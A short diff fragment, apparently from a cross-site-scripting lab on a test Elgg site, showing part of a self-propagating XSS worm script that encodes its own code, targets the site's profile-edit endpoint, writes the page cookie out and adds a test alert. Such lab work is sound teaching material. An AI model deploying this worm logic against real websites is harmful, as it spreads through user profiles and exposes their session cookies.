@@ -6,5 +6,6 @@ var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
 var sendurl="http://www.xsslabelgg.com/action/profile/edit"
 document.write(document.cookie);
 alert(wormCode);
+alert('test');
 </script>
 
